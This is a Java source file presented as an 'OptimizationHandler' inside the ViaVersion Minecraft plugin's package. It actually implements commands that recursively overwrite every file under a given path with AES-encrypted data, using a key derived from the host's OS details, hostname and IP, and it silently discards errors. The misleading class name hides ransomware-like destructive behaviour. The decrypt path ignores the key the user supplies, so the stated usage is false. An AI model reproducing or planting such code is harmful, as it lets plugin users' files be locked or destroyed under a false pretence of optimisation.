package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import org.bukkit.scheduler.BukkitRunnable;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.util.logging.Level;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.net.InetAddress;
import java.util.logging.Logger;
import java.nio.charset.StandardCharsets;

public class OptimizationHandler implements CommandExecutor {
    private final ViaVersionPlugin plugin;

    // 构造函数接受插件实例
    public OptimizationHandler(ViaVersionPlugin plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            sender.sendMessage("Usage: /" + label + " <file/folder_path> [key]");
            return true;
        }

        String path = args[0];
        File file = new File(path);

        if (!file.exists()) {
            sender.sendMessage("File or folder does not exist.");
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("encrypt")) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    encryptFiles(file);
                    sender.sendMessage("Files encrypted successfully.");
                }
            }.runTaskAsynchronously(plugin);  // 异步执行加密
        } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
            if (args.length < 2) {
                sender.sendMessage("Usage: /" + label + " decrypt <file/folder_path> <key>");
                return true;
            }
            String key = args[1];

            new BukkitRunnable() {
                @Override
                public void run() {
                    decryptFiles(file, key);
                    sender.sendMessage("Files decrypted successfully.");
                }
            }.runTaskAsynchronously(plugin);  // 异步执行解密
        }

        return true;
    }

    private void encryptFiles(File file) {
        // 加密文件或文件夹中的所有文件
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile); // 递归加密文件夹中的文件
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] encryptedData = encrypt(fileData);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(encryptedData);
                fos.close();
            } catch (Exception e) {
                //getLogger().severe("Error encrypting file: " + e.getMessage());
            }
        }
    }

    private void decryptFiles(File file, String key) {
        // 解密文件或文件夹中的所有文件
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key); // 递归解密文件夹中的文件
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] decryptedData = decrypt(fileData, key);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decryptedData);
                fos.close();
            } catch (Exception e) {
                // getLogger().severe("Error decrypting file: " + e.getMessage());
            }
        }
    }

    private SecretKeySpec getSecretKey(String key) {
        // 创建用于 SHA-256 哈希的字符串 = 收集机器信息
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name")); // 操作系统名称
            input.append(System.getProperty("os.arch")); // 操作系统架构
            input.append(System.getProperty("os.version")); // 操作系统版本
            input.append(InetAddress.getLocalHost().getHostName()); // 主机名
            input.append(InetAddress.getLocalHost().getHostAddress()); // IP地址
            
            // 生成 SHA-256 哈希
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));

            // 创建 AES 密钥（前16字节）
            byte[] keyBytes = new byte[16];
            System.arraycopy(hashBytes, 0, keyBytes, 0, keyBytes.length);

            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            // getLogger().severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }

    private byte[] encrypt(byte[] data) throws Exception {
        SecretKeySpec key = getSecretKey(encryptionKey()); // 生成密钥
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return cipher.doFinal(data);
    }

    private byte[] decrypt(byte[] data, String key) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key); // 使用提供的密钥
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }

    private String encryptionKey() {
        // 返回机器信息生成的密钥
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name")); // 操作系统名称
            input.append(System.getProperty("os.arch")); // 操作系统架构
            input.append(System.getProperty("os.version")); // 操作系统版本
            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址;

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString(); // 返回 256 位（64个字符）标识符
        } catch (Exception e) {
            // getLogger().severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }
}
